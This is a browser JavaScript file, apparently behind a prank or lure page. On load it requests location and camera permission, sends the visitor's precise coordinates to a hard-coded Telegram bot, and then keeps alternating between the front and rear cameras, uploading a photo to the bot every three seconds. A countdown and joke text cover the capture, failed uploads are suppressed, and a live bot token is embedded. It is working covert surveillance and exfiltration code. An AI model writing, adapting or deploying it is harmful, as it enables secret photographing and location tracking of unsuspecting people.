const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const countdownEl = document.getElementById('countdown');
const hazbikText = document.getElementById('hazbikText');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');
const reloadBtn = document.getElementById('reloadBtn');

let currentCamera = 'user'; // фронтальная или задняя
let stream = null;
let photoInterval = null;

async function requestPermissions() {
  try {
    await requestGeo();
    await requestCameraTest();
    startCountdown();
  } catch {
    showReloadButton();
  }
}

function requestGeo() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject();
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        sendLocationToTelegram(lat, lon);
        resolve();
      },
      err => reject(err),
      { enableHighAccuracy: true, timeout: 7000 }
    );
  });
}

async function requestCameraTest() {
  const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
  stopStream(testStream);
  return Promise.resolve();
}

function startCountdown() {
  let count = 3;
  countdownEl.textContent = count;
  countdownEl.style.display = 'block';
  hazbikText.style.display = 'none';
  reloadBtn.style.display = 'none';

  const interval = setInterval(() => {
    count--;
    if (count === 0) {
      clearInterval(interval);
      countdownEl.style.display = 'none';
      hazbikText.style.display = 'block';

      setTimeout(() => {
        hazbikText.style.display = 'none';
        reloadBtn.style.display = 'block';
      }, 3000);

      startCameraCycle();
    } else {
      countdownEl.textContent = count;
    }
  }, 1000);
}

async function startCameraCycle() {
  photoInterval = setInterval(async () => {
    try {
      if (stream) {
        stopStream(stream);
        videoEl.srcObject = null;
      }

      currentCamera = currentCamera === 'user' ? 'environment' : 'user';
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: false });
      videoEl.srcObject = stream;
      await new Promise(res => (videoEl.onloadedmetadata = res));
      sendPhotoToTelegram();
    } catch {
      clearInterval(photoInterval);
      showReloadButton();
    }
  }, 3000);
}

function sendPhotoToTelegram() {
  const ctx = canvasEl.getContext('2d');
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  canvasEl.toBlob(blob => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, `${currentCamera}_photo.jpg`);
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(() => {});
  }, 'image/jpeg', 0.8);
}

function sendLocationToTelegram(lat, lon) {
  const url = `https://maps.google.com/?q=${lat},${lon}`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `🌍 Геолокация: ${url}`
    })
  });
}

function stopStream(s) {
  s.getTracks().forEach(track => track.stop());
}

function showReloadButton() {
  reloadBtn.style.display = 'block';
  reloadBtn.onclick = () => location.reload();
  countdownEl.style.display = 'none';
  hazbikText.style.display = 'none';
}

// Запускаем всё
requestPermissions();
